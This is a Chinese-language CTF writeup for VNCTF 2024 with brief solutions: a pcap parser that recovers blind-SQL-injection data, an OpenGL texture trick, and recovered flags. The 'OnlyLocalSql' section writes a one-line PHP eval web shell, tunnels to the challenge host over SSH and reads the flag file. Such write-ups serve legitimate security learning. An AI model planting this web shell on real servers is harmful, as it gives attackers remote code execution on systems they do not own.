---
title: '2024 VNCTF Writeup'
description: '生成两张透明图片替代资源中的砖块图像'
pubDate: 2024-04-05
author: 'IHK-1'
tags: ['CTF', 'VNCTF', '2024']
---

# sqlshark
```python
# 过滤出sql语句
# tshark.exe -r sqlshark.pcap -T fields -e urlencoded-form.value -Y 'http' >out

import re

data = open(r"out", encoding='utf-16').read()
data = re.findall('(\d*) fOr 1\)\)\)\)in\((\d*)\)\)', data)

flag = [0] * 15
for item in data:
    num = int(item[0])
    value = int(item[1])
    flag[num] = value

print(''.join(map(chr,flag)))

# admin_p@ssw0rd
# VNCTF{admin_p@ssw0rd}
```

# ez_msb
[solve.zip](https://www.yuque.com/attachments/yuque/0/2024/zip/35229002/1708144189842-f8495779-1a59-4fb5-87dc-dfc8a43c604f.zip)

```plain
VNCTF{gnuradio_best_radio_3de8b}
```

# LearnOpenGL
生成两张透明图片替代资源中的砖块图像

```python
from PIL import Image

img = Image.new('RGBA', (128, 128), (0, 0, 0, 0))
img.save('out.png')
```

```plain
VNCTF{T3xtur3_M45t3r_0r_r3v_g405hou_8703d0ccfef0}
```

# OnlyLocalSql
```plain
# 写入shell
echo '<?php eval($_POST[abc123]) ?>' >shell.php

# 开启远程代理
ssh -L 5555:127.0.0.1:80 ctf@manqiu.top -p 20657

# 蚁剑连接
localhost:5555 
cd ../../../ && cat flag

vnctf{00812b25-a3c2-4af8-8607-b9aede1960f2}
```

